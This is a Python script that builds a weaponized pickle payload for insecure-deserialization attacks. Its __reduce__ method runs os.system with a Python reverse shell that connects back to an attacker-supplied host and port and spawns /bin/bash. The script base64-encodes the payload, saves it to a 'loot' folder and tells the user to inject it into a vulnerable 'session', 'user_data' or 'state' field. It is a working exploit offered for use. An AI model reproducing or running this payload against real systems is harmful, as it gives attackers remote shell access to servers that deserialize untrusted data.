import sys
import pickle
import base64
import os

class ChimeraReverseShell:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def __reduce__(self):
        """
        The magic method for deserialization exploitation. 
        Returns a tuple (callable, arguments) to be executed by the OS.
        """
        # Low-level Python reverse shell primitive
        cmd = (
            f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        )
        return (os.system, (cmd,))

def generate_weaponized_pickle(lhost, lport):
    """
    Serializes the ChimeraReverseShell object and encodes it for injection.
    """
    print(f"[*] Constructing RCE Payload for {lhost}:{lport}...")
    
    try:
        # Generate the raw pickle stream
        payload_obj = ChimeraReverseShell(lhost, lport)
        raw_pickle = pickle.dumps(payload_obj)
        
        # Base64 encode for transport (common for cookies/API params)
        b64_payload = base64.b64encode(raw_pickle).decode()
        
        print("[!!!] WEAPONIZED PAYLOAD GENERATED [!!!]")
        print("-" * 60)
        print(b64_payload)
        print("-" * 60)
        
        # Save to loot for audit
        loot_path = os.path.join("..", "loot", f"pickle_payload_{lhost}_{lport}.txt")
        with open(loot_path, "w") as f:
            f.write(b64_payload)
        print(f"[+] Payload archived in: {loot_path}")
        print("[*] Tactical Note: Inject this into the vulnerable 'session', 'user_data', or 'state' field.")

    except Exception as e:
        print(f"[-] Generation Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 127_deserializer <LHOST> <LPORT>")
        sys.exit(1)
    
    generate_weaponized_pickle(sys.argv[1], sys.argv[2])
